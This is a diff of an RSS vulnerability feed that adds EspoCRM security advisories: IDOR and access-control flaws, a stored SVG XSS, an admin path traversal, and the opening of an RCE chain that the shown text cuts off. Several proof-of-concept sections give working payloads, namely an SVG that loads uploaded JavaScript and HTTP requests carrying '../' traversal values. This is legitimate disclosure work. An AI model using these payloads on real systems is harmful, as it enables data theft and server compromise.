@@ -7,7 +7,7 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Tue, 02 Jun 2026 08:25:44 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 03 Jun 2026 08:51:41 +0000</lastBuildDate>
     <item>
       <title>[MEDIUM] mautic/mautic – Stored Cross-Site Scripting (XSS) in Project Option Selector</title>
       <link>https://github.com/mautic/mautic/security/advisories/GHSA-5hvg-w58j-545m</link>
@@ -300,6 +300,49 @@ The prerequisites are:&#13;
   This is a session-revocation flaw in the community server. Administrative idle deactivation does not actually terminate existing authenticated sessions, so deactivated users retain API access until tokens are separately removed.</description>
       <guid isPermaLink="false">GHSA-6g3w-vg5p-w892</guid>
       <pubDate>Mon, 25 May 2026 11:32:10 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – Broken Access Control / IDOR in Note Pinning API allows unauthorized modification of notes</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-c3rm-m24p-255p</link>
+      <description>### Summary&#13;
+A business logic flaw (Broken Access Control) in EspoCRM 9.3.3 allows low-privileged users to pin arbitrary notes without having the required edit permissions for the parent object. Due to a "write first, authorize later" execution flaw in the backend API, even though the server correctly returns a `403 Forbidden` error, the targeted note's pinned status is already persistently modified in the database.&#13;
+&#13;
+### Details&#13;
+The root cause lies in the server-side processing of the `POST /api/v1/Note/{id}/pin` endpoint. In `application/Espo/Tools/Stream/Api/PostNotePin.php`, the `process()` method first calls `getNote($id)` before calling `checkParent($note)`. &#13;
+The actual authorization check determining whether the user has edit permissions for the parent object (checkParent($note)) is executed after the note has already been pinned and saved. Thus, the API returns a 403 Forbidden response (No parent edit access.), but the database state has already been altered. By contrast, the unpin API (DeleteNotePin.php) properly checks permissions before saving.&#13;
+&#13;
+### PoC&#13;
+1. Environment Setup:&#13;
+&#13;
+Create a standard user (low1).&#13;
+Assign a low-privilege role to low1 with only Read = All access and Edit = No access to the Account entity.&#13;
+&lt;img width="2386" height="493" alt="image-20260413231510637" src="https://github.com/user-attachments/assets/aceec774-05cc-4d79-a284-03d1c9ab92a3" /&gt;&#13;
+As an administrator, create an Account record (TestAccount-A) and post a standard note in its stream.&#13;
+&lt;img width="2236" height="1107" alt="image-20260413231723487" src="https://github.com/user-attachments/assets/190df9ce-620d-4f94-b6a9-9f8335188a7b" /&gt;&#13;
+Notice that in the UI for low1, the "Pin" button is correctly hidden due to lack of edit permissions.&#13;
+&lt;img width="1189" height="327" alt="image-20260413232208266" src="https://github.com/user-attachments/assets/ae31a24b-c0d4-41cc-8ce2-61955e907999" /&gt;&#13;
+2. Attack Execution:&#13;
+Retrieve the target Note ID by intercepting the read request to the Account stream. &#13;
+&lt;img width="1531" height="661" alt="image-20260413231842536" src="https://github.com/user-attachments/assets/4c1a1539-fafe-45e7-82ab-94808c9e785e" /&gt;&#13;
+Send a manual POST request to the pin endpoint using the low1 user's authentication tokens:&#13;
+```http&#13;
+GET /api/v1/Account/69dcff9316b000ed0/stream?filter=&amp;maxSize=5&amp;offset=0&amp;orderBy=number&amp;order=desc HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+Authorization: Basic &lt;low1-token&gt;&#13;
+Espo-Authorization: &lt;low1-token&gt;&#13;
+Espo-Authorization-By-Token: true&#13;
+Cookie: auth-token-secret=&lt;secret&gt;; auth-token=&lt;token&gt;&#13;
+```&#13;
+&lt;img width="1529" height="656" alt="image-20260413231958316" src="https://github.com/user-attachments/assets/f71119e6-c4f6-4de6-84d9-0e755cd3b2d9" /&gt;&#13;
+3. Verification:&#13;
+The server responds with 403 Forbidden and X-Status-Reason: No parent edit access.. However, refreshing the page shows the note has indeed been pinned successfully, confirming the unauthorized database write operation.&#13;
+&lt;img width="1270" height="346" alt="image-20260413232517838" src="https://github.com/user-attachments/assets/3f80967c-5848-486e-8614-856f9d07c06f" /&gt;&#13;
+&#13;
+### Impact&#13;
+This vulnerability allows attackers to bypass UI restrictions and enforce state changes on business objects they do not own or have edit access to. In scenarios like sales, ticketing, or customer relationship follow-ups, attackers can manipulate the priority and visibility of notes (by pinning them), introducing confusion in business workflows. The fact that the API returns an error while still modifying the database creates a difficult-to-audit "phantom write" scenario.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-c3rm-m24p-255p</guid>
+      <pubDate>Fri, 15 May 2026 06:43:36 +0000</pubDate>
     </item>
     <item>
       <title>[HIGH] RocketChat/Rocket.Chat – SAML signature validation skipped when IdP certificate field is empty</title>
@@ -3098,6 +3141,244 @@ Stored XSS enables arbitrary JavaScript execution in the context of the applicat
       <pubDate>Sat, 09 May 2026 08:02:43 +0000</pubDate>
     </item>
     <item>
+      <title>[MEDIUM] espocrm/espocrm – IDOR in EmailTemplate Prepare Endpoint Leaks Entity Data via Email Address Lookup</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-vvmh-mf4h-96hw</link>
+      <description>### Summary&#13;
+The `POST /api/v1/EmailTemplate/:id/prepare` endpoint accepts an `emailAddress` parameter and resolves the owning entity (Contact, Lead, Account, or User) without performing an ACL check. An authenticated user with EmailTemplate read permission can extract all field values of any entity by supplying the target's email address, bypassing `read: own` or `read: team` ACL restrictions.&#13;
+&#13;
+### Details&#13;
+When processing an email template, `Espo\Tools\EmailTemplate\Processor::prepare()` resolves entities in two ways:&#13;
+&#13;
+1. **By `parentId`** (lines 386-401): Fetches the entity and checks ACL via `$this-&gt;aclManager-&gt;checkEntityRead()`. If the user lacks read access, `$parent` is set to `null`. **This path is secure.**&#13;
+&#13;
+2. **By `emailAddress`** (lines 362-383): Calls `getEntityByAddress()` to look up the entity owning the supplied email address, then adds it directly to the template rendering context (`$entityHash`). **No ACL check is performed.** The entity's full attribute set is then used for template variable substitution via `Formatter::formatAttributeValue()`.&#13;
+&#13;
+```php&#13;
+// Processor.php lines 362-383 — NO ACL CHECK&#13;
+if ($data-&gt;getEmailAddress()) {&#13;
+    $foundByAddressEntity = $this-&gt;getEmailAddressRepository()-&gt;getEntityByAddress(&#13;
+        $data-&gt;getEmailAddress(),&#13;
+        null,&#13;
+        [Contact::ENTITY_TYPE, Lead::ENTITY_TYPE, Account::ENTITY_TYPE, User::ENTITY_TYPE]&#13;
+    );&#13;
+}&#13;
+&#13;
+if ($foundByAddressEntity) {&#13;
+    if ($foundByAddressEntity instanceof Person) {&#13;
+        $entityHash[PersonTemplate::TEMPLATE_TYPE] = $foundByAddressEntity;&#13;
+    }&#13;
+&#13;
+    if (!isset($entityHash[$foundByAddressEntity-&gt;getEntityType()])) {&#13;
+        $entityHash[$foundByAddressEntity-&gt;getEntityType()] = $foundByAddressEntity;&#13;
+    }&#13;
+}&#13;
+```&#13;
+&#13;
+The attacker creates or uses an existing email template containing placeholder variables (e.g., `{{Contact.description}}`, `{{Person.name}}`). By calling the prepare endpoint with the victim's email address, the server resolves the victim's entity and fills the template — returning all referenced field values in the API response.&#13;
+&#13;
+### PoC&#13;
+[poc.zip](https://github.com/user-attachments/files/26829066/poc.zip)&#13;
+&#13;
+Please extract the uploaded compressed file before proceeding&#13;
+&#13;
+1. docker compose up -d&#13;
+2. bash exploit.sh&#13;
+&#13;
+&lt;img width="997" height="359" alt="스크린샷 2026-04-17 오후 11 16 40" src="https://github.com/user-attachments/assets/d98e386c-abde-4d20-a212-4f38d7c3483d" /&gt;&#13;
+&#13;
+&#13;
+&#13;
+### Impact&#13;
+An authenticated user with EmailTemplate read permission (a common permission for regular CRM users) can read **all fields** of any Contact, Lead, Account, or User entity by knowing the target's email address. This bypasses the intended ACL model (`read: own`, `read: team`, etc.).&#13;
+&#13;
+Leaked data can include:&#13;
+- Personal information (names, phone numbers, addresses)&#13;
+- Internal notes, descriptions, and custom field values</description>
+      <guid isPermaLink="false">GHSA-vvmh-mf4h-96hw</guid>
+      <pubDate>Fri, 08 May 2026 15:35:18 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm – Stored SVG attachment can execute same-origin uploaded JavaScript when opened via image or attachment entry points</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-5wh5-ccv2-m3pv</link>
+      <description># Stored SVG attachment can execute same-origin uploaded JavaScript when opened via image or attachment entry points&#13;
+&#13;
+---&#13;
+&#13;
+## Summary&#13;
+EspoCRM allows authenticated users to upload SVG attachments through normal attachment-capable fields and later serves those SVG files as top-level inline documents through both the `attachment` and `image` entry points. Although inline SVG script is blocked by the response CSP, the same CSP still allows same-origin external script. As a result, an attacker can upload a malicious SVG plus a second attacker-controlled JavaScript attachment, then trick another user into opening the SVG and execute JavaScript in the victim's EspoCRM origin.&#13;
+&#13;
+## Details&#13;
+Normal stream attachment fields such as `Note.attachments` do not define any `accept` restriction:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Resources/metadata/entityDefs/Note.json#L68-L76](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Resources/metadata/entityDefs/Note.json#L68-L76)&#13;
+&#13;
+EspoCRM explicitly allows `image/svg+xml` as an image upload type:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Resources/metadata/app/image.json#L2-L25](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Resources/metadata/app/image.json#L2-L25)&#13;
+&#13;
+The attachment checker enforces that image uploads match the configured image allowlist, which includes SVG:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Tools/Attachment/Checker.php#L108-L127](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Tools/Attachment/Checker.php#L108-L127)&#13;
+&#13;
+```php&#13;
+public function checkTypeImage(Attachment $attachment, ?string $filePath = null): void&#13;
+{&#13;
+    $extension = DetailsObtainer::getFileExtension($attachment) ?? '';&#13;
+&#13;
+    $mimeType = $this-&gt;mimeType-&gt;getMimeTypeByExtension($extension);&#13;
+&#13;
+    $imageTypeList = $this-&gt;metadata-&gt;get(['app', 'image', 'allowedFileTypeList']) ?? [];&#13;
+&#13;
+    if (!in_array($mimeType, $imageTypeList)) {&#13;
+        throw new ForbiddenSilent("Not allowed file type.");&#13;
+    }&#13;
+&#13;
+    $setMimeType = $attachment-&gt;getType();&#13;
+&#13;
+    if (strtolower($setMimeType ?? '') !== $mimeType) {&#13;
+        throw new ForbiddenSilent("Passed type does not correspond to extension.");&#13;
+    }&#13;
+}&#13;
+```&#13;
+&#13;
+When the uploaded SVG is opened through either entry point, EspoCRM serves it back as a top-level `image/svg+xml` document with `Content-Security-Policy: default-src 'self'`:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/EntryPoints/Attachment.php#L77-L99](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/EntryPoints/Attachment.php#L77-L99)&#13;
+&#13;
+[application/Espo/EntryPoints/Image.php#L106-L156](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/EntryPoints/Image.php#L106-L156)&#13;
+&#13;
+```php&#13;
+if (!in_array($fileType, $this-&gt;getAllowedFileTypeList())) {&#13;
+    throw new Forbidden("Not allowed file type '{$fileType}'.");&#13;
+}&#13;
+&#13;
+$response&#13;
+    -&gt;setHeader('Content-Length', (string) $size)&#13;
+    -&gt;setHeader('Cache-Control', 'private, max-age=864000, immutable')&#13;
+    -&gt;setHeader('Content-Security-Policy', "default-src 'self'")&#13;
+    -&gt;setBody($stream);&#13;
+&#13;
+$response&#13;
+    -&gt;setHeader('Content-Disposition', 'inline;filename="' . $fileName . '"')&#13;
+    -&gt;setHeader('Content-Length', (string) $fileSize)&#13;
+    -&gt;setHeader('Content-Security-Policy', "default-src 'self'");&#13;
+```&#13;
+&#13;
+That CSP blocks inline SVG script, but it still permits external same-origin script because no separate `script-src` is defined. The attacker can therefore upload a second JavaScript attachment and reference it from the SVG with:&#13;
+&#13;
+```xml&#13;
+&lt;script xlink:href="http://127.0.0.1:8080/?entryPoint=download&amp;amp;id=&lt;JS_ATTACHMENT_ID&gt;"&gt;&lt;/script&gt;&#13;
+```&#13;
+&#13;
+The regular download entry point still serves the attacker-controlled attachment contents from the same origin:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/EntryPoints/Download.php#L82-L96](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/EntryPoints/Download.php#L82-L96)&#13;
+&#13;
+```php&#13;
+$disposition = 'attachment';&#13;
+&#13;
+$inlineMimeTypeList = $this-&gt;metadata-&gt;get(['app', 'file', 'inlineMimeTypeList']) ?? [];&#13;
+&#13;
+if (in_array($type, $inlineMimeTypeList)) {&#13;
+    $disposition = 'inline';&#13;
+&#13;
+    $response-&gt;setHeader('Content-Security-Policy', "default-src 'self'");&#13;
+}&#13;
+&#13;
+$response-&gt;setHeader('Content-Description', 'File Transfer');&#13;
+&#13;
+if ($type) {&#13;
+    $response-&gt;setHeader('Content-Type', $type);&#13;
+}&#13;
+```&#13;
+&#13;
+The data flow is:&#13;
+- Attacker uploads a JavaScript attachment through a normal attachment flow.&#13;
+- Attacker uploads an SVG attachment that references that JavaScript through `?entryPoint=download&amp;id=&lt;jsId&gt;`.&#13;
+- Victim opens the SVG directly through `?entryPoint=attachment&amp;id=&lt;svgId&gt;` or `?entryPoint=image&amp;id=&lt;svgId&gt;`.&#13;
+- The browser renders the SVG as a top-level document in the EspoCRM origin.&#13;
+- CSP blocks inline script but allows same-origin external script.&#13;
+- The uploaded JavaScript executes in the victim's authenticated origin.&#13;
+&#13;
+## PoC&#13;
+The issue was reproduced on tag `9.3.3` in the Docker test instance with a browser session.&#13;
+&#13;
+1. Upload a JavaScript attachment containing:&#13;
+&#13;
+```javascript&#13;
+alert(document.domain);&#13;
+document.documentElement.setAttribute('data-alert-script', 'executed');&#13;
+```&#13;
+&#13;
+2. Upload an SVG attachment containing:&#13;
+&#13;
+```xml&#13;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&#13;
+     xmlns:xlink="http://www.w3.org/1999/xlink"&#13;
+     width="240" height="80"&gt;&#13;
+  &lt;text x="10" y="30"&gt;svg-alert-test&lt;/text&gt;&#13;
+  &lt;script xlink:href="http://127.0.0.1:8080/?entryPoint=download&amp;amp;id=&lt;JS_ATTACHMENT_ID&gt;"&gt;&lt;/script&gt;&#13;
+&lt;/svg&gt;&#13;
+```&#13;
+&#13;
+3. Open the SVG directly in the browser:&#13;
+&#13;
+```http&#13;
+GET /?entryPoint=attachment&amp;id=&lt;SVG_ATTACHMENT_ID&gt; HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+```&#13;
+&#13;
+or:&#13;
+&#13;
+```http&#13;
+GET /?entryPoint=image&amp;id=&lt;SVG_ATTACHMENT_ID&gt; HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+```&#13;
+&#13;
+Observed runtime behavior:&#13;
+- Response status: `200`&#13;
+- Response `Content-Type`: `image/svg+xml`&#13;
+- Response CSP: `default-src 'self'`&#13;
+- JavaScript executes in the page anyway through the same-origin `download` URL&#13;
+- Browser displays `alert(document.domain)` with value `127.0.0.1`&#13;
+&#13;
+Evidence:&#13;
+&lt;img width="943" height="269" alt="xss_alert" src="https://github.com/user-attachments/assets/37782a1b-d4f8-4d67-80cf-d60e69042dbe" /&gt;&#13;
+&#13;
+&#13;
+During testing, the same chain also changed `document.title` and set DOM markers from the external script payload when opened through both the `attachment` and `image` entry points.&#13;
+&#13;
+## Impact&#13;
+This is stored cross-user XSS reachable through a normal attachment workflow.&#13;
+&#13;
+Any authenticated user who can upload attachments to a field such as `Note.attachments` can prepare a malicious SVG/JavaScript pair and send or expose the SVG to another user. When the victim opens that SVG directly, the attacker gains JavaScript execution in the victim's EspoCRM origin.&#13;
+&#13;
+Impact includes:&#13;
+- Reading data available to the victim in the browser.&#13;
+- Performing state-changing actions with the victim's session.&#13;
+- Exfiltrating application data or tokens accessible from the origin.&#13;
+- Pivoting into account takeover or broader CRM compromise depending on victim privileges.&#13;
+&#13;
+## Remediation&#13;
+Do not serve user-uploaded SVG as active same-origin documents.&#13;
+&#13;
+Recommended fixes:&#13;
+- Remove `image/svg+xml` from the allowed image type list for user-uploaded attachments, or sanitize SVG server-side before storage.&#13;
+- Serve SVG and other active content from a separate untrusted origin.&#13;
+- Add a restrictive CSP for SVG responses, for example an explicit `script-src 'none'` and `object-src 'none'`.&#13;
+- Consider forcing download with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` for SVG.&#13;
+- Review whether generic attachment upload should allow attacker-controlled JavaScript files to be fetched from the same authenticated origin.&#13;
+&#13;
+---</description>
+      <guid isPermaLink="false">GHSA-5wh5-ccv2-m3pv</guid>
+      <pubDate>Fri, 08 May 2026 15:33:41 +0000</pubDate>
+    </item>
+    <item>
       <title>[MEDIUM] open-webui/open-webui – Read-Only Users Can Modify Collaborative Documents via Socket.IO</title>
       <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-vrfh-rj4q-rmhr</link>
       <description># Read-Only Users Can Modify Collaborative Documents via Socket.IO&#13;
@@ -4682,6 +4963,316 @@ Any user with Argo CD application get permissions can extract real Kubernetes Se
       <pubDate>Fri, 24 Apr 2026 07:36:06 +0000</pubDate>
     </item>
     <item>
+      <title>[HIGH] espocrm/espocrm – Admin TemplateManager path traversal allows arbitrary file read write and delete</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-44c3-xjfp-3jrh</link>
+      <description>## Summary&#13;
+The admin template management endpoints accept attacker-controlled `name` and `scope` values and pass them into template path construction without normalization or traversal filtering. As a result, an authenticated admin can use `../` sequences to escape the intended template directory and read, create, overwrite, or delete arbitrary files that resolve to `body.tpl` or `subject.tpl` under the web application user's filesystem permissions.&#13;
+&#13;
+## Details&#13;
+EspoCRM exposes generic controller action routes over the API. The admin UI uses them to call:&#13;
+- `GET /api/v1/TemplateManager/action/getTemplate`&#13;
+- `POST /api/v1/TemplateManager/action/saveTemplate`&#13;
+- `POST /api/v1/TemplateManager/action/resetTemplate`&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Resources/routes.json#L112-L118](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Resources/routes.json#L112-L118)&#13;
+&#13;
+[client/src/views/admin/template-manager/edit.js#L93-L96](https://github.com/espocrm/espocrm/blob/9.3.3/client/src/views/admin/template-manager/edit.js#L93-L96)&#13;
+&#13;
+[client/src/views/admin/template-manager/edit.js#L152-L172](https://github.com/espocrm/espocrm/blob/9.3.3/client/src/views/admin/template-manager/edit.js#L152-L172)&#13;
+&#13;
+[client/src/views/admin/template-manager/edit.js#L205-L216](https://github.com/espocrm/espocrm/blob/9.3.3/client/src/views/admin/template-manager/edit.js#L205-L216)&#13;
+&#13;
+On the server side, `TemplateManager` takes `name` and `scope` directly from the request and forwards them to `TemplateFileManager`:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Controllers/TemplateManager.php#L66-L88](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Controllers/TemplateManager.php#L66-L88)&#13;
+&#13;
+[application/Espo/Controllers/TemplateManager.php#L95-L128](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Controllers/TemplateManager.php#L95-L128)&#13;
+&#13;
+[application/Espo/Controllers/TemplateManager.php#L134-L166](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Controllers/TemplateManager.php#L134-L166)&#13;
+&#13;
+`TemplateFileManager` then interpolates those values into filesystem paths without sanitization:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Core/Utils/TemplateFileManager.php#L97-L132](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Core/Utils/TemplateFileManager.php#L97-L132)&#13;
+&#13;
+[application/Espo/Core/Utils/TemplateFileManager.php#L148-L160](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Core/Utils/TemplateFileManager.php#L148-L160)&#13;
+&#13;
+Finally, `FileReader` and `FileManager` operate on the resulting path as-is:&#13;
+&#13;
+View on GitHub:&#13;
+[application/Espo/Core/Utils/Resource/FileReader.php#L53-L61](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Core/Utils/Resource/FileReader.php#L53-L61)&#13;
+&#13;
+[application/Espo/Core/Utils/Resource/FileReader.php#L72-L108](https://github.com/espocrm/espocrm/blob/9.3.3/application/Espo/Core/Utils/Resource/FileReader.php#L72-L108)&#13;
+&#13;
+```php&#13;
+public function getActionGetTemplate(Request $request): stdClass&#13;
+{&#13;
+    $name = $request-&gt;getQueryParam('name');&#13;
+    $scope = $request-&gt;getQueryParam('scope');&#13;
+&#13;
+    $returnData-&gt;body = $templateFileManager-&gt;getTemplate($name, 'body', $scope);&#13;
+&#13;
+    if ($hasSubject) {&#13;
+        $returnData-&gt;subject = $templateFileManager-&gt;getTemplate($name, 'subject', $scope);&#13;
+    }&#13;
+}&#13;
+&#13;
+public function postActionSaveTemplate(Request $request): bool&#13;
+{&#13;
+    $data = $request-&gt;getParsedBody();&#13;
+    $scope = !empty($data-&gt;scope) ? $data-&gt;scope : null;&#13;
+&#13;
+    if (isset($data-&gt;subject)) {&#13;
+        $templateFileManager-&gt;saveTemplate($data-&gt;name, 'subject', $data-&gt;subject, $scope);&#13;
+    }&#13;
+&#13;
+    if (isset($data-&gt;body)) {&#13;
+        $templateFileManager-&gt;saveTemplate($data-&gt;name, 'body', $data-&gt;body, $scope);&#13;
+    }&#13;
+}&#13;
+&#13;
+private function getCustomFilePath(&#13;
+    string $language,&#13;
+    string $type,&#13;
+    string $name,&#13;
+    ?string $entityType = null&#13;
+): string {&#13;
+    if ($entityType) {&#13;
+        return "custom/Espo/Custom/Resources/templates/{$type}/{$language}/{$entityType}/{$name}.tpl";&#13;
+    }&#13;
+&#13;
+    return "custom/Espo/Custom/Resources/templates/{$type}/{$language}/{$name}.tpl";&#13;
+}&#13;
+&#13;
+public function read(string $path, Params $params): string&#13;
+{&#13;
+    $exactPath = $this-&gt;findExactPath($path, $params);&#13;
+&#13;
+    if (!$exactPath) {&#13;
+        throw new RuntimeException("Resource file '$path' does not exist.");&#13;
+    }&#13;
+&#13;
+    return $this-&gt;fileManager-&gt;getContents($exactPath);&#13;
+}&#13;
+```&#13;
+&#13;
+Because `name` becomes the `{$type}` segment and `scope` becomes the `{$entityType}` segment, an attacker can supply values such as `../../../../../../../../tmp/docker-proof-1774295507767` and escape the intended `custom/Espo/Custom/Resources/templates/` root. The primitive is limited by the hardcoded filenames, so the attacker controls the destination directory but the final files are still named `body.tpl` and `subject.tpl`.&#13;
+&#13;
+## PoC&#13;
+The issue was reproduced on tag `9.3.3` with an authenticated admin session in the browser. The proof below writes files into `/tmp` inside the Docker container, demonstrating that traversal is not limited to the application tree.&#13;
+&#13;
+1. Open the admin template manager UI and issue the save request with a traversal payload:&#13;
+&#13;
+```http&#13;
+POST /api/v1/TemplateManager/action/saveTemplate HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+Content-Type: application/json&#13;
+&#13;
+{&#13;
+  "scope": "EmailTemplate",&#13;
+  "name": "../../../../../../../../tmp/docker-proof-1774295507767",&#13;
+  "subject": "SUBJECT_docker-proof-1774295507767",&#13;
+  "body": "BODY_docker-proof-1774295507767",&#13;
+  "language": "en_US"&#13;
+}&#13;
+```&#13;
+&#13;
+Observed result in the browser and Burp Proxy:&#13;
+&#13;
+```text&#13;
+HTTP/1.1 200 OK&#13;
+&#13;
+true&#13;
+```&#13;
+&#13;
+2. Verify on the Docker filesystem that the application created files outside the intended template directory:&#13;
+&#13;
+```bash&#13;
+docker compose exec app sh -lc 'ls -l /tmp/docker-proof-1774295507767/en_US/EmailTemplate'&#13;
+docker compose exec app sh -lc 'cat /tmp/docker-proof-1774295507767/en_US/EmailTemplate/body.tpl'&#13;
+docker compose exec app sh -lc 'cat /tmp/docker-proof-1774295507767/en_US/EmailTemplate/subject.tpl'&#13;
+```&#13;
+&#13;
+Observed result:&#13;
+&#13;
+```text&#13;
+-rw-rw-r-- 1 www-data www-data ... body.tpl&#13;
+-rw-rw-r-- 1 www-data www-data ... subject.tpl&#13;
+&#13;
+BODY_docker-proof-1774295507767&#13;
+SUBJECT_docker-proof-1774295507767&#13;
+```&#13;
+&#13;
+3. Read the traversed files back through the same vulnerable API:&#13;
+&#13;
+```http&#13;
+GET /api/v1/TemplateManager/action/getTemplate?scope=EmailTemplate&amp;name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fdocker-proof-1774295507767&amp;language=en_US HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+```&#13;
+&#13;
+Observed result:&#13;
+&#13;
+```json&#13;
+{"body":"BODY_docker-proof-1774295507767","subject":"SUBJECT_docker-proof-1774295507767"}&#13;
+```&#13;
+&#13;
+4. Delete the traversed files with the reset flow:&#13;
+&#13;
+```http&#13;
+POST /api/v1/TemplateManager/action/resetTemplate HTTP/1.1&#13;
+Host: 127.0.0.1:8080&#13;
+Content-Type: application/json&#13;
+&#13;
+{&#13;
+  "scope": "EmailTemplate",&#13;
+  "name": "../../../../../../../../tmp/docker-proof-1774295507767",&#13;
+  "language": "en_US"&#13;
+}&#13;
+```&#13;
+&#13;
+Observed result:&#13;
+&#13;
+```text&#13;
+HTTP/1.1 500 Internal Server Error&#13;
+```&#13;
+&#13;
+This `500` happens after deletion, because the endpoint removes the traversed files and then attempts to read them again.&#13;
+&#13;
+5. Verify the files were removed from the container:&#13;
+&#13;
+```bash&#13;
+docker compose exec app sh -lc 'test ! -e /tmp/docker-proof-1774295507767/en_US/EmailTemplate/body.tpl &amp;&amp; test ! -e /tmp/docker-proof-1774295507767/en_US/EmailTemplate/subject.tpl &amp;&amp; echo removed'&#13;
+```&#13;
+&#13;
+Observed result:&#13;
+&#13;
+```text&#13;
+removed&#13;
+```&#13;
+&#13;
+## Impact&#13;
+This is a path traversal vulnerability in an admin-facing feature.&#13;
+&#13;
+An authenticated admin can:&#13;
+- Read arbitrary files ending in `body.tpl` or `subject.tpl` outside the intended template directories.&#13;
+- Create or overwrite such files in attacker-chosen directories reachable by traversal under the web application's effective filesystem permissions.&#13;
+- Delete such files through the reset flow.&#13;
+&#13;
+Depending on deployment layout, this can impact:&#13;
+- Template integrity for other features and modules.&#13;
+- Sensitive files stored with matching names.&#13;
+- Application availability if important `.tpl` files are overwritten or deleted.&#13;
+&#13;
+The attack surface is externally reachable over HTTP, but exploitation requires admin privileges.&#13;
+&#13;
+## Remediation&#13;
+Do not concatenate user-controlled template identifiers directly into filesystem paths.&#13;
+&#13;
+Recommended fixes:&#13;
+- Strictly allowlist valid template names and scope values.&#13;
+- Reject `..`, `/`, `\\`, and other path metacharacters before path construction.&#13;
+- Resolve the final path with canonicalization and verify that it remains inside the intended template root.&#13;
+- Apply the same validation to both read and write/delete flows.&#13;
+&#13;
+---</description>
+      <guid isPermaLink="false">GHSA-44c3-xjfp-3jrh</guid>
+      <pubDate>Wed, 22 Apr 2026 17:08:12 +0000</pubDate>
+    </item>
+    <item>
+      <title>[CRITICAL] espocrm/espocrm – Authenticated RCE via Formula with path traversal in attachment `sourceId`, exploitable by admin user</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-7922-x7cf-j54x</link>
+      <description>## Note from vendor&#13;
+&#13;
+Exploitable only by an admin user. The step with writing to .htaccess (which should not be enabled on production) is not necessary, as a PHP code can be injected into some PHP file instead with the same impact.&#13;
+&#13;
+Writing the Attachment `sourceId` field  in Formula is widely used by our users to copy attachments (for example to re-use the same attachment file).&#13;
+&#13;
+## Summary&#13;
+EspoCRM's built-in formula scripting engine allowing updating attachment's sourceId thus allowing an authenticated admin to overwrite the `sourceId` field on `Attachment` entities. Because `sourceId` is concatenated directly into a file path with no sanitization in `EspoUploadDir::getFilePath()`, an attacker can redirect any file read or write operation to an arbitrary path within the web server's `open_basedir` scope.&#13;
+&#13;
+## Details&#13;
+The vulnerability is a chain of two root causes that individually rate as High severity and together produce Critical/RCE.&#13;
+&#13;
+### Root Cause 1: Formula allows to update Attachment's `sourceId`&#13;
+&#13;
+The formula engine's `record\update` allows updating entity attributes with arbitrary values.&#13;
+&#13;
+### Root Cause 2: Unsanitized `sourceId` in File Path Construction&#13;
+&#13;
+**File:** `application/Espo/Core/FileStorage/Storages/EspoUploadDir.php` (~line 115–119)&#13;
+&#13;
+```php&#13;
+protected function getFilePath(Attachment $attachment)&#13;
+{&#13;
+    $sourceId = $attachment-&gt;getSourceId();&#13;
+    return 'data/upload/' . $sourceId;  // No basename(), realpath(), or .. check&#13;
+}&#13;
+```&#13;
+&#13;
+This method is used for **both reads and writes**. If `sourceId` contains path traversal sequences (e.g., `../../client/shell`), the resolved path escapes `data/upload/`.&#13;
+&#13;
+**File:** `application/Espo/Tools/Attachment/UploadService.php` (~line 133–157, method `uploadChunk`)&#13;
+&#13;
+```php&#13;
+$filePath = $this-&gt;getAttachmentRepository()-&gt;getFilePath($attachment);&#13;
+$this-&gt;fileManager-&gt;appendContents($filePath, $contents);&#13;
+```&#13;
+&#13;
+The chunk upload endpoint retrieves the *current* `sourceId` from the database at the time of the upload request. If `sourceId` was modified between attachment creation and chunk upload (via the formula engine — Root Cause 1), the write goes to the attacker-controlled path.&#13;
+&#13;
+`fileManager-&gt;appendContents()` calls `checkCreateFile()` which creates intermediate directories as needed — no existing file or directory is required.&#13;
+&#13;
+### Attack Chain&#13;
+&#13;
+The two root causes combine as follows:&#13;
+&#13;
+1. Create an `Attachment` entity with `isBeingUploaded: true` using a benign `.txt` filename and `relatedType: Document` (passes the extension whitelist check).&#13;
